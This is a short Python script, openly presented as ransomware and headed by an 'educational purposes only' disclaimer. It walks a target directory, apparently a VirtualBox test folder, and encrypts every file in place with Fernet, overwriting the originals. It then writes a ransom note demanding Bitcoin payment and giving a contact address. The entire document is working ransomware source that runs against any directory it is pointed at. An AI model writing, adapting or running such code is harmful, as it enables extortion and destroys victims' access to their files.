#Disclaimer: This script is for educational purposes only and should not be used for malicious activities.
import os
from cryptography.fernet import Fernet

#Generate and save encryption key
def generate_key():
	key = Fernet.generate_key()
	with open("encryption.key", "wb") as key_file:
		key_file.write(key)
	return key
#Load the encryption key
def load_key():
	return open("encryption.key", "rb").read()
#Encrypt a single file
def encrypt_file(file_path, key):
	with open(file_path, "rb") as file:
		data = file.read()
	encrypted_data = Fernet(key).encrypt(data)
	with open(file_path, "wb") as file:
		file.write(encrypted_data)
#Encrypt all files in a directory
def encrypt_directory(directory, key):
	for root,dirs,files in os.walk(directory):
		for file in files:
			#Skip the ransom note and key files
			if file == "RANSOM_NOTE.txt" or file =="encryption.key":
				continue
			file_path = os.path.join(root, file)
			encrypt_file(file_path, key)
		print(f"Encrypted: {file_path}")
#Create a ransom note
def create_ransom_note(directory):
	note_path = os.path.join(directory, "RANSOM_NOTE.txt")
	with open(note_path, "w") as note:
		note.write( "Your files have been encrypted!\n"
			    "To decrypt them, you need to pay 1000 Bitcoin to the following address:\n"
			    "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n"
			    "Contact us at hacker@example.com with proof of payment.\n" )
	print(f"Ransom note created: {note_path}")

#Main Function
def main():

	#target directory
	target_directory = "C:\\Users\\vboxuser\\Desktop\\RansomwareTest"
	#generate encryption key
	key = generate_key()
	print("Encryption key generated and saved.")
	#encrypt files in target directory
	encrypt_directory(target_directory, key)
	#create ransom note
	create_ransom_note(target_directory)
	print("Ransomware attack completed.")

if __name__ == "__main__":
	main()
